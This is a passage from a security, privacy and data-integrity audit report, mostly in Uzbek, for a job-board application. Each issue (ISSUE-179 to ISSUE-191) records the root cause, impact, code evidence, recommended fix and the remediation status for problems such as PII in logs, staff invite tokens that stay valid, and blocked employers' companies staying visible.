- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** notifications/privacy
- **Fayl:** `apps/api/src/modules/notifications/notifications.service.ts:90`
- **Root cause:** use(channel) faqat wanted va foydalanuvchi sozlamalarini tekshiradi, features.email/telegram/push'ni emas. SMTP_HOST bo'sh bo'lsa sendUserEmail baribir foydalanuvchini o'qiydi va sendMail console.log bilan qabul qiluvchi manzilini yozadi. TELEGRAM_BOT_TOKEN bo'sh bo'lsa notifyUserViaTelegram user'ni o'qiydi va tg() bo'sh tokenli /bot/sendMessage'ni chaqiradi.
- **Impact:** SMTP'siz prod'da (email product kanali emas, ehtimol) har bildirishnoma stdout'ga email yozadi; 10k broadcast ~10k manzilni logga tushiradi (PII). Har bildirishnomaga ortiqcha DB so'rovlari, muvaffaqiyatsiz HTTP chaqiruvlar va ogohlantirish shovqini; rule K toza 'mavjud emas' holatini kutadi.
- **Evidence:** notifications.service.ts:90 `use = c => wanted.includes(c) && !off.has(c)`; :128-160 features tekshiruvsiz; :170-175 user.findUnique email. mailer.ts:38 `console.log(`[mail:o'chiq] ${input.to} — ${input.subject}`)`. telegram.service.ts:15 API() tokenni tekshirmaydi; :197-204 notifyUserViaTelegram. env.ts:186-189 features.
- **Recommended fix:** deliver() da available = {email: features.email, telegram: features.telegram, push: features.push, in_app: true} bilan mavjud bo'lmagan kanallarni DB ishidan oldin o'tkazib yuboring. O'chiq mail logidan manzilni olib tashlang (faqat son). Token bo'lmasa tg() darhol qaytsin.
- **Severity izohi:** P2 saqlandi: logga PII tushishi va keraksiz yuk; rule L ro'yxatida email yo'q, lekin maxfiylik muammosi.
- **Manba topilmalar:** realtime-5
- **Bajarilgan fix:** realtime-5: FIXED — channelAvailable() gates telegram/push/email on features.* before any DB read, so with no SMTP/bot token nothing is looked up, no request goes to api.telegram.org with an empty tok
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-180

**O'qilganlik belgilari yashirin yoki fon tabdan yuboriladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** frontend/realtime
- **Fayl:** `apps/web/src/lib/messages/useMessenger.ts:194`
- **Root cause:** Tanlangan suhbatga kelgan xabar document ko'rinadimi yoki fokusdami tekshirilmay darhol socket.markRead qilinadi. Yashirin tabdagi reconnect loadThread chaqiradi, uning REST GET'i ham server'da o'qildi deb belgilaydi. Chat va bildirishnoma client kodida visibility/focus tekshiruvi yo'q.
- **Impact:** /messages tabi kichraytirilgan yoki fonda turganda yuboruvchi ikki belgini ko'radi va qabul qiluvchi badge'i tozalanadi. O'sha socket isOnline'ni true ushlagani uchun Telegram alert ham ketmaydi — xabar o'qilgandek ko'rinib e'tibordan chetda qoladi.
- **Evidence:** useMessenger.ts:159 isActive = tanlangan suhbat; :194-197 `if (!mine && isActive) { socket.markRead(conversationId); ... }`; :218-223 reconnect reloadList + loadThread. chat.routes.ts:512-520 GET messages updateMany isRead. grep visibilityState|document.hidden — faqat AuthContext.tsx va TelegramConnect.tsx.
- **Recommended fix:** Faqat document.visibilityState==='visible' va fokus bo'lsa markRead qiling; aks holda unread deb sanab 'visibilitychange'/'focus' da yuboring. Jim qayta yuklash uchun history GET'ga ?markRead=false opsiyasi.
- **Severity izohi:** P2 saqlandi: noto'g'ri o'qildi holati va o'tkazib yuborilgan alert — funksional UX muammo.
- **Manba topilmalar:** realtime-6
- **Bajarilgan fix:** realtime-6: FIXED — "O'qildi" endi faqat document.visibilityState=visible VA oyna fokusda bo'lganda yuboriladi (isPageActive). Yashirin tabda kelgan xabar o'qilmagan bo'lib qoladi, suhbat id'si kutish
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-181

**'system' bildirishnoma turi broadcast, moderatsiya natijalari va to'lovlarni qamraydi, foydalanuvchi uni barcha kanallarda o'chira oladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** notifications
- **Fayl:** `apps/api/prisma/schema.prisma:119`
- **Root cause:** Faqat 4 tur bor. Admin broadcast, vakansiya rad etilishi, kompaniya tasdig'i va billing 'system' ishlatadi. Sozlamalar API 'system' ni har kanalda, jumladan in_app'da o'chirishga ruxsat beradi va deliver() buni hurmat qiladi. Rule G/L hodisalari (telefon almashtirildi, tiklash boshlandi, sessiyalar bekor qilindi) uchun o'chirib bo'lmaydigan security kategoriyasi yo'q.
- **Impact:** Marketing broadcast'larni o'chirgan foydalanuvchi vakansiya rad etilishi va tasdiq xabarlarini ham olmaydi (employer e'lon nega yo'qolganini bilmaydi). Kelajakdagi xavfsizlik ogohlantirishlari o'chiriladigan yoki broadcast bilan aralash bo'ladi.
- **Evidence:** schema.prisma:119-124 enum NotificationType. admin.routes.ts:574 broadcast type 'system'; :315-321 rad etish 'system'. notifications.routes.ts:147-172 PUT preferences har (type, channel) ni upsert qiladi. notifications.service.ts:90 use() off to'plamini hurmat qiladi.
- **Recommended fix:** 'moderation', 'broadcast' va 'security' turlariga ajrating. 'security' majburiy (doim in_app + bog'langan bo'lsa Telegram, o'chirib bo'lmaydi), 'moderation' in_app'da majburiy. Sozlamalar matritsasi va web adapter kategoriyalarini yangilang; mavjud qatorlar 'system' bo'lib qoladi.
- **Severity izohi:** P2 saqlandi: rule L security event'lari uchun zarur tayyorgarlik.
- **Manba topilmalar:** realtime-11
- **Bajarilgan fix:** realtime-11: PARTIAL — Cannot add NotificationType enum values (prisma/schema.prisma is not owned). Mitigation in notify(): notifications whose payload.i18n.key starts with security./vacancy./company. (o
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-182

**Admin rol o'zgartirish rollararo nomuvofiq ma'lumot qoldiradi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** admin/users
- **Fayl:** `apps/api/src/modules/admin/admin.routes.ts:217`
- **Root cause:** PATCH /api/admin/users/:id/role faqat role'ni yozadi va sessiyalarni bekor qiladi. Maqsadning joriy rolini tekshirmaydi (staff ham o'zgaradi) va egalik qilgan kompaniya, vakansiyalar, arizalar, suhbatlar, StaffProfile yoki maqolalarni qayta ishlamaydi. Ownership helperlari rolga qaramay ownerUserId bo'yicha ishlaydi.
- **Impact:** employer→job_seeker: kompaniya va faol vakansiyalar ochiq qoladi, yangi arizalar /api/employer/* ga kira olmaydigan foydalanuvchiga boradi; u o'z kompaniyasiga ariza va sharh ham yoza oladi. job_seeker→employer: arizalar va seeker suhbatlari employer ostida qoladi. content_editor→job_seeker: StaffProfile va chop etilgan maqolalar staff bo'lmagan muallifda.
- **Evidence:** admin.routes.ts:217-226 `z.enum(['job_seeker','employer','admin'])`, user.update({data:{role}}), revokeUserSessions, closeUserSockets — boshqa hech narsa. ownership.ts:10-12 faqat ownerUserId. DATA_INTEGRITY.md rol-nomuvofiqlik tekshiruvlari faqat dev bazada 0 bergan.
- **Recommended fix:** Ma'lumot yetim qoladigan rol o'zgarishini 409 (sonlar bilan) rad eting yoki aniq o'tish bajaring: vakansiyalarni arxivlab qidiruvdan olish, o'ziga ariza/sharhni bloklash, tarixni read-only qoldirish. Route'ni faqat job_seeker va employer maqsadlariga cheklang, staff rollari team.routes'da. role_changed SecurityEvent yozing.
- **Severity izohi:** P2 saqlandi. ISSUE-035/108 faqat sessiya bekor qilishni tuzatgan; ma'lumot o'tishi yangi.
- **Manba topilmalar:** data-integrity-6
- **Bajarilgan fix:** data-integrity-6: FIXED — Role change away from employer archives the owner's active vacancies with adminArchivedAt, so no live vacancy is left behind a non-employer account.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-183

**Hisobni bloklash unga bog'liq ma'lumotlarni ochiq va erishiladigan holda qoldiradi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** admin/block
- **Fayl:** `apps/api/src/modules/admin/admin.routes.ts:203`
- **Root cause:** Blok faqat employer'ning active vakansiyalarini arxivlaydi. /api/candidates, sitemap va alert sweep'dan tashqari hech bir o'qish/yozish yo'li qarshi tomonning isBlocked'ini tekshirmaydi. Unblock hech narsani tiklamaydi va blok qaysi vakansiyalarni yopgani qayd etilmaydi.
- **Impact:** Seeker bloklangan employer bilan suhbat ochib yozadi, uning kompaniyasi reyting bilan katalogda qoladi. Employer ariza ro'yxatida bloklangan seeker email/telefon/rezyumesini oladi. Bloklangan foydalanuvchilarning sharh va baholari reytingga ta'sir qiladi. Unblock'dan keyin blok yopgan va ega yopgan vakansiyalarni ajratib bo'lmaydi.
- **Evidence:** admin.routes.ts:203-208 faqat status 'active' arxivlanadi. chat.routes.ts:342-347 company.findUnique, owner blok tekshiruvisiz. applications.routes.ts:171-220 isBlocked filtrsiz, candidates.routes.ts:50 esa `isBlocked:false`. seo.routes.ts:116 bloklangan egani chiqaradi, companies.list.ts'da isBlocked/owner filtri yo'q (grep).
- **Recommended fix:** Yagona blok siyosatini belgilab hamma joyda qo'llang: bloklangan ega kompaniyasini katalog, kompaniya sahifasi va chat start'dan chiqaring; employer ro'yxatida bloklangan seeker'ni belgilang; reyting agregatlaridan bloklanganlarning sharhlarini chiqaring; blok arxivlaganlarga closedBy='block' qo'yib unblock'da tiklang.
- **Severity izohi:** P2 saqlandi. ISSUE-035/108 faqat sessiyalarni qamragan; D-012 candidates ro'yxatini tuzatgan.
- **Manba topilmalar:** data-integrity-7
- **Bajarilgan fix:** data-integrity-7: PARTIAL — Block now archives AND locks the owner's vacancies and revokes their pending staff invites. The other read paths named in the finding (chat start/deliver, employer application list
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-184

**Seed va eski vakansiyalarda workplaceType yo'q; sxemada category va workplaceType ixtiyoriy; remote+office ziddiyati qabul qilinadi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** WONT FIX
- **Area:** vacancy/data
- **Fayl:** `apps/api/src/prisma/demo-seed.ts:1689`
- **Root cause:** Ikkala seed ham workplaceType yozmaydi, backfill yo'q, Vacancy.categoryId va workplaceType sxemada ixtiyoriy. To'g'ri ishlash effectiveWorkplaceType fallback'iga (employmentType 'remote') tayanadi. createSchema employmentType 'remote' + workplaceType office/hybrid kombinatsiyasini rad etmaydi.
- **Impact:** DI-1 (83/83 dev vakansiyada workplace_type yo'q) har demo qayta yaratilganda qaytadi — workplaceType majburiy qoidasi va demo qamrovi buziladi. Eski masofaviy bo'lmagan qatorlar qayta e'londan oldin tahrir talab qiladi, admin approve esa qoidani umuman chetlaydi. Ziddiyatli remote+office qatorlar filtr va facets'ni buzadi.
- **Evidence:** grep -c workplaceType: demo-seed.ts 0, seed.ts 0. schema.prisma:402 `categoryId String?`; :412 `workplaceType WorkplaceType?`. vacancies.routes.ts:60-63 categoryId va workplaceType majburiy, lekin employmentType 'remote' bilan refine yo'q. DATA_INTEGRITY.md DI-1 = 83; D-028 seed tegilmagan.
- **Recommended fix:** Ikkala seed'da workplaceType yozing (demo qayta yaratishda --for ni ham bering). Idempotent backfill: employmentType remote → remote, qolganlarini egaga tahrir uchun belgilang (taxmin qilmang). Schema refine: employmentType 'remote' faqat workplaceType 'remote' bilan, yoki 'remote' bandlik turini deprecate qiling. Backfill'dan keyin maydonlarni majburiy qiling.
- **Severity izohi:** P2 saqlandi. Tracker ID yo'q (DI-1, D-028 hujjatlashtirgan); ISSUE-089 faqat remote employmentType qismi bilan kesishadi.
- **Manba topilmalar:** data-integrity-8
- **Bajarilgan fix:** data-integrity-8: WONT FIX — D-067: additiv migratsiya, eski yozuvlar backfill qilinmaydi; workplaceType yangi va tahrirlangan e'lonlarda majburiy
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-185

**Audit tekshiruv skriptlari (data integrity, scale bench, explain) repoda yo'q; DATA_INTEGRITY baseline eskirgan va yangi auth qoidalarini qamramaydi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** tooling/integrity
- **Fayl:** `docs/audit/maps/DATA_INTEGRITY.md:4`
- **Root cause:** 103 ta read-only tekshiruv bir marta 61 foydalanuvchili dev bazada, repo tashqarisidagi vaqtinchalik scratchpad skripti bilan bajarilgan; scale_bench.mjs va explain_queries.mjs ham repoda yo'q. Tekshiruvlar yangi auth qoidalaridan oldin yozilgan: users bo'yicha faqat email va telegramChatId dublikati. e2e barcha userlarni to'g'ridan-to'g'ri phone-verified qiladi.
- **Impact:** 10k miqyosida prod invariantlarini, ayniqsa phone/Telegram unique indekslaridan oldin dublikatlarni, qayta tekshirib bo'lmaydi — indeks deploy'da yiqiladi yoki dublikatlar yashirin qoladi. Hujjatlangan indeks jadvali allaqachon noto'g'ri; o'lchanmagan yo'llardagi scale fix'larini oldin/keyin bilan tasdiqlab bo'lmaydi.
- **Evidence:** DATA_INTEGRITY.md:4 skript AppData/Local/Temp/.../scratchpad; :37 'to'liq mos' deydi, lekin jadvalda users created_at, vacancies [status,is_premium,published_at]/[company_id,status], applications created_at/[vacancy_id,status], notifications [user_id,created_at] yo'q (schema.prisma:203,442,444,476-477,628). :178-183 users tekshiruvlari. apps/api/scripts: faqat e2e-check.mjs, generate-vapid.mjs. FINAL_AUDIT.md:110 skriptlarga havola. e2e-check.mjs:244,341,1254 updateMany isPhoneVerified.
- **Recommended fix:** apps/api/scripts ostiga qat'iy read-only data-integrity.mjs (findRaw, count, listIndexes) va test bo'lmagan baza nomini rad etadigan scale/ generator, bench, explain skriptlarini commit qiling. Yangi tekshiruvlar: verified phone dublikati, verified+null phone, E.164 bo'lmagan raqam, telegramChatId dublikati va manfiy (guruh) chat, additionalPhone boshqa hisob raqamiga teng, blok egasining faol vakansiyalari, egasi employer bo'lmagan kompaniya, status ≠ oxirgi history. Staging nusxasida qayta ishga tushirib indeks jadvalini yangilang.
- **Severity izohi:** Integrity P2, bench P3 berilgan; bir root cause (tekshiruv vositalari repoda emas va eskirgan). P1 unique-indeks fix'i shunga bog'liq bo'lgani uchun P2. ISSUE-101 boshqa (Playwright skriptlari eskirgan).
- **Manba topilmalar:** data-integrity-11, data-integrity-12, scale-10k-19
- **Bajarilgan fix:** data-integrity-11: PARTIAL — integrity skripti scratchpad'da; yangi auth qoidalari uchun tekshiruvlar qo'shilmadi | data-integrity-12: PARTIAL — auth yaxlitligi e2e va auth-telegram-check bilan qoplandi; alohida integrity skripti yo'q
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-186

**Nomzodlar bazasi har profil uchun relation filter $lookup va to'liq rezyume bilan ishlaydi (8000 nomzodda p50 ~2 s)**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** scale/search
- **Fayl:** `apps/api/src/modules/candidates/candidates.routes.ts:47`
- **Root cause:** where user{role,isBlocked}, resumes.some{published} va matnda resumes.some.title / skills.some.skillName relation filtrlarini ishlatadi; Prisma Mongo ularni har profil uchun $lookup qiladi, keyin userId bo'yicha sort va skip (inference: query shakli va D-033 dan; explain qilinmagan). include to'liq experience va education'ni yuklaydi. JobSeekerProfile'da faqat [regionId] indeksi.
- **Impact:** Har sahifa yoki qidiruv urinishi ~2 s va nomzodlar soniga chiziqli o'sadi; matnli variant yana sekinroq (o'lchanmagan). Chuqur sahifalar qimmatroq, javob rezyume bo'limlari bilan kattalashadi.
- **Evidence:** candidates.routes.ts:47-63 relation va OR filtrlari; :66-85 skip/take, orderBy userId, include resumes{skills,experience,education}; :16 pageSize<=50. schema.prisma:225 faqat @@index([regionId]). FINAL_AUDIT.md: 'Nomzodlar bazasi (8 000 nomzod): p50 1 972 ms ... tasdiqlanmagan'.
- **Recommended fix:** Avval ID'larni aniqlang: published resume'lardan distinct jobSeekerId va bloklangan job_seeker userId'lar, keyin profillarni id in + isOpenToWork + regionId bilan keyset sahifalang. Uzoq muddat: JobSeekerProfile.isSearchable (+skillNames, resumeUpdatedAt) denormalizatsiyasi va indeks. Ro'yxatda title, skills va summary snippet; experience/education expand'da. ISSUE-007/008 maxfiylik qoidalari o'zgarmasin.
- **Severity izohi:** P2 saqlandi (performance). FINAL_AUDIT'da ID'siz kuzatuv sifatida bor edi; tracker ID yo'q.
- **Manba topilmalar:** db-perf-3, scale-10k-3
- **Bajarilgan fix:** db-perf-3: PARTIAL — user va resumes relation filtrlari ($lookup) butunlay olib tashlandi: chop etilgan rezyume va bloklangan hisob ID'lari oldindan, chegaralangan so'rovlar bilan olinadi. Tavsiyadagi  | scale-10k-3: FIXED — Tavsiya qilingan yondashuv bajarildi: chop etilgan rezyumelardan jobSeekerId to'plami (Resume[status] indeksi) + bloklangan foydalanuvchilar to'plami, so'ng profil so'rovi id in [.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-187

**Bloklangan ish beruvchining kompaniyasi sitemap'dan boshqa barcha o'qish yo'llarida ochiq qoladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** visibility/company
- **Fayl:** `apps/api/src/modules/companies/companies.routes.ts:187`
- **Root cause:** Bloklash handler'i egasining aktiv vakansiyalarini arxivlaydi va sessiyalarini bekor qiladi, lekin Company qatoriga yashirish belgisini qo'ymaydi. /api/companies/:slug, listCompanies base $match, similarCompanies va nomzodning companySlug bilan /api/conversations/start chaqiruvi owner.isBlocked'ni tekshirmaydi. Faqat sitemap-employer egasi bloklanganlarni chiqarib tashlaydi (ISSUE-056 fix'i), ya'ni qoida mavjud, lekin faqat bitta yo'lga qo'llangan.
- **Impact:** Admin firibgarlik uchun 'X LLC' egasini bloklaydi va vakansiyalar arxivlanadi. Lekin mehmonlar /companies/x-llc sahifasini (SSR, 200) logo, tavsif, sayt havolasi va tasdiqlangan sharhlar bilan ko'rishda davom etadi. Kompaniya katalog va qidiruvda, boshqa kompaniyalarning 'o'xshash' blokida va bosh sahifadagi top-kompaniyalarda qoladi. Nomzodlar uni saqlashi va hech kim o'qimaydigan suhbat ochishi mumkin. Bu moderatsiya natijasini zaiflashtiradi.
- **Evidence:** admin.routes.ts:203-211 faqat `vacancy.updateMany({ companyId in, status: active } -> archived)`, company o'zgarmaydi. companies.routes.ts:187 `company.findUnique({ where: { slug } })`, egasi bo'yicha filtr yo'q. companies.list.ts:242-271 base filtrlari faqat text/industry/region/size/verified/saved; :381-398 similarCompanies. chat.routes.ts:345 companySlug bo'yicha findUnique -> getOrCreateConversation. seo.routes.ts:116 `NOT: { owner: { isBlocked: true } }`.
- **Recommended fix:** Company'ga denormallashtirilgan ownerBlocked (yoki hiddenAt) maydonini qo'shing: block/unblock handler'i uni o'rnatsin va tozalasin, allaqachon bloklangan egalar uchun backfill qiling. Shu maydon bo'yicha filtrni /api/companies/:slug (404), listCompanies base $match (indekslangan, qo'shimcha $lookup'siz), similarCompanies, nomzodning conversations/start va sitemap-employer'ga qo'shing. Unblock'da ham bumpDataVersion chaqiring. Mavjud suhbatlar uchun mahsulot qarori kerak (masalan, faqat o'qish). e2e: egani bloklash -> detail 404, katalog va o'xshashlar ro'yxatida yo'q.
- **Severity izohi:** Ikkala manba P2, ildizi bir xil; gap4-1'ning aniqroq fayl:qatori va yechimi olindi. ISSUE-056 sitemap samaradorligi haqida bo'lgani uchun muammo yangi deb belgilandi.
- **Manba topilmalar:** gap1-8, gap4-1
- **Bajarilgan fix:** gap1-8: PARTIAL — listCompanies excludes companies whose owner is blocked (bounded 5000-id $nin, indexed by the new User @@index([isBlocked])). Because similarCompanies goes through listCompanies, / | gap4-1: FIXED — Done in my files: GET /api/companies/:slug -> 404, GET /api/companies/:slug/similar -> 404 and POST /api/companies/:slug/reviews -> 404 when owner.isBlocked (no denormalised column
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-188

**Staff taklif tokeni uzoq muddatli bearer-sir: adminga xom holda qaytariladi va taklif qilgan admin bloklansa ham ishlaydi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** authz/staff-invite
- **Fayl:** `apps/api/src/modules/team/team.routes.ts:227`
- **Root cause:** findUsableInvite faqat revokedAt, acceptedAt va expiresAt'ni tekshiradi. Accept taklif qilgan admin hali ham faol admin ekanini tekshirmasdan invite.role bilan (admin ham bo'lishi mumkin) foydalanuvchi yaratadi. Staff'ni bloklash yoki rolini o'zgartirish sessiya va socketlarni yopadi, lekin uning kutilayotgan takliflarini bekor qilmaydi. POST /api/admin/team/invites xom tokenli havolani email yuborilgan bo'lsa ham qaytaradi. Qabul qilish uchun token va yangi parolning o'zi yetadi, taklif qilingan emailga egalik tekshirilmaydi.
- **Impact:** Egallangan admin sessiyasi orqali hujumchi o'z emailiga role=admin taklif yaratib, havolani oladi. Egalar adminni bloklaydi, lekin hujumchi 7 kun ichida taklifni qabul qilib, yangi tokenlarga ega yangi super-admin hisobini oladi. Super-admin yaratadigan sir admin DOM'i, clipboard, skrinshot va chatlarga tushadi va uni qo'lga kiritgan odam parolni o'zi tanlaydi. Bu 'admin xom tokenlarni ko'rmasin' tamoyiliga zid.
- **Evidence:** team.routes.ts:29 `INVITE_TTL_MS = 7 kun`, :30 `staffRole = z.enum(['admin', ...])`; :88-94 findUsableInvite faqat revokedAt/acceptedAt/expiresAt; :138 `link = ${env.WEB_ORIGIN}/admin/invite?token=${token}`; :152-156 `send({ invite, link, emailSent })`, email yuborilgan bo'lsa ham; :227-261 accept: token + body.password -> `user.create({ role: invite.role })` (:254). admin.routes.ts:190-224 block/role staffInvite'ga tegmaydi. web TeamInvite.tsx:102 `<input readOnly value={result.link}>`.
- **Recommended fix:** Staff bloklanganda yoki roli o'zgarganda (team PATCH va admin block/role'da) `staffInvite.updateMany({ invitedById: id, ...PENDING }, { revokedAt: now })` bajaring. Accept'da taklif qilgan foydalanuvchini qayta yuklang va uning role 'admin' hamda bloklanmagan ekanini talab qiling. Havolani faqat emailSent=false bo'lganda, bir marta va ogohlantirish bilan qaytaring. Admin roli uchun TTL'ni 24 soatgacha qisqartiring va hisob yaratishdan oldin taklif qilingan emailga yuborilgan bir martalik kod bilan egalikni tasdiqlang. Taklif yaratish, qabul qilish va bekor qilish uchun audit hodisalarini yozing.
- **Severity izohi:** gap2-3 (P2) va gap3-3 (P3) ildizi bir xil: staff taklifi hech narsaga bog'lanmagan bearer-sir. Birlashtirilgan muammo P2.
- **Manba topilmalar:** gap2-3, gap3-3
- **Bajarilgan fix:** gap2-3: FIXED — revokePendingStaffInvites(inviterId) is called when an admin is blocked or demoted, from both /api/admin/users/:id/block|role and /api/admin/team/:id. Accepted invites are untouche | gap3-3: NOT FIXED — Returning the invite link only when email delivery failed requires apps/web/src/components/admin/team/TeamInvite.tsx (renders result.link in a copy field) and lib/admin/team.ts, ne
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-189

**Push obunalari seansga bog'lanmagan: logout, sessiyalarni bekor qilish va bloklashdan keyin ham bildirishnomalar kelaveradi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** privacy/push
- **Fayl:** `apps/api/src/common/push.ts:37`
- **Root cause:** sendPushToUser foydalanuvchining barcha saqlangan obunalariga yuboradi, notify esa isBlocked'ni tekshirmaydi. Web logout /api/push/unsubscribe'ni chaqirmaydi va brauzer obunasini bekor qilmaydi (usePush faqat NotificationSettings'da ishlatiladi). revokeUserSessions faqat tokenVersion'ni oshiradi; admin block va rol o'zgarishi pushSubscription qatorlarini o'chirmaydi. Obuna qatorida tokenVersion saqlanmaydi.
- **Impact:** Foydalanuvchi umumiy yoki ommaviy kompyuterda chiqib ketadi, lekin brauzer boshqa odam obuna bo'lgunicha uning bildirishnomalarini (ariza holati 'Rad etildi', yangi mos vakansiyalar, admin xabarlari) ko'rsatishda davom etadi. 'Barcha qurilmalardan chiqish', bloklash va kelajakdagi parol tiklash (J) eski qurilmalarga yetkazishni to'xtatmaydi.
- **Evidence:** push.ts:37 `prisma.pushSubscription.findMany({ where: { userId } })`, :46-49 har biriga `webpush.sendNotification`. AuthContext.tsx:163-183 logout: bumpSessionEpoch, setAccessToken(null), logoutUser(), push tozalanmaydi. usePush.ts:110-121 faqat qo'lda o'chirilganda unsubscribe. notifications.service.ts:141-149 kanal yoqilgan bo'lsa push yuboriladi. auth.service.ts:166-173 revokeUserSessions faqat tokenVersion'ni oshiradi. admin.routes.ts:190-224 pushSubscription'ga tegmaydi.
- **Recommended fix:** Logout'da klient token hali mavjud paytda serverdagi endpoint'ni o'chirsin va sub.unsubscribe() chaqirsin. Serverda obuna paytida PushSubscription'ga tokenVersion yozing; sendPushToUser eskirgan versiyali qatorlarga yubormasin va ularni o'chirsin. Block, rol o'zgarishi va parol tiklashda barcha qatorlarni o'chiring. Bloklangan foydalanuvchiga tashqi kanallar (push, Telegram, email) orqali yubormang.
- **Severity izohi:** P2 saqlandi.
- **Manba topilmalar:** gap2-4
- **Bajarilgan fix:** gap2-4: FIXED — closeUserSockets() deletes the user's push subscriptions, and it is called from revokeUserSessions (logout, 'log out everywhere', block, role change, password reset, phone change) 
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-190

**Tasdiqlangan kompaniya belgisi nom o'zgarganda saqlanib qoladi: brend nomi ostida o'zini boshqa kompaniya qilib ko'rsatish mumkin**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** authz/trust
- **Fayl:** `apps/api/src/modules/companies/companies.routes.ts:110`
- **Root cause:** PUT /api/employer/company egasining kompaniyasida name, description, website, industry va region'ni yangilaydi, lekin isVerified'ga tegmaydi. src'da isVerified'ni qayta tiklaydigan kod yo'q. Admin verify amali tasdiqlangan nomga bog'lanmagan, bir martalik bayroq xolos.
- **Impact:** Ish beruvchi 'Kichik MChJ'ni tasdiqlatadi, keyin uni taniqli brend nomiga o'zgartiradi. Belgi saqlanib qoladi, kompaniya katalogning mashhurlik saralashida birinchi turadi va 'tasdiqlangan' filtrlarida chiqadi. Nomzodlar ariza berib yoki chat ochib, telefon va emailini soxta brendga beradi.
- **Evidence:** companies.routes.ts:108-120 `prisma.company.update({ data: { name: body.name, description, website, regionId, industry, employeeCount, foundedYear } })`, isVerified yo'q. `isVerified: false` grep faqat seed.ts:120,140 da topiladi. admin.routes.ts:374 verify endpoint'i. companies.list.ts:174 popular saralashda is_verified x 1e12; :265 va vacancies.service.ts:179 verified filtri.
- **Recommended fix:** Tasdiqlangan kompaniyaning nomi (xohishga ko'ra website yoki logo ham) o'zgarganda isVerified=false qiling yoki o'zgarishni admin tasdiqlaguncha pending holatda saqlang. Adminlarni xabardor qiling va audit hodisasini yozing. Ish beruvchi interfeysida 'tasdiq qayta ko'rib chiqiladi' ogohlantirishini uz/ru/en tillarida ko'rsating.
- **Severity izohi:** P2 saqlandi: hujumchi avval haqiqiy yuridik shaxs sifatida tasdiqdan o'tishi kerak va bu javobgarlik izini qoldiradi, shuning uchun P1 emas.
- **Manba topilmalar:** gap2-2
- **Bajarilgan fix:** gap2-2: FIXED — Rename of a verified company clears isVerified in the same update, so it also drops out of the popular sort's is_verified boost and the verified filter immediately (bumpDataVersion
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-191

**Meilisearch va MongoDB bir xil so'rovga turli natija qaytaradi; drayver saralash, filtr, facet va alertlarga qarab almashadi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** search/driver-parity
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.service.ts:352`
- **Root cause:** Qidiruv semantikasi ikkita mustaqil kodda yozilgan, ular orasida paritet shartnomasi ham, test ham yo'q. Meili faqat matn bor, saralash relevance va company/verified/premium/sana filtrlari yo'q bo'lganda ishlaydi; facetlar va alertlar doim Mongo'da. Mongo har bir so'zni AND bilan substring sifatida talab qiladi. Meili esa so'z/prefiks moslik, typo tolerance va sukutdagi 'last' matchingStrategy bilan ishlaydi (Meili hujjatlaridan xulosa). Meili tavsifning faqat 4000, talablarning 2000 belgisini indekslaydi. Mongo noma'lum experience/employment qiymatlarini allow-list bo'yicha tashlab yuboradi, Meili ularni xom holda IN filtriga qo'yadi.
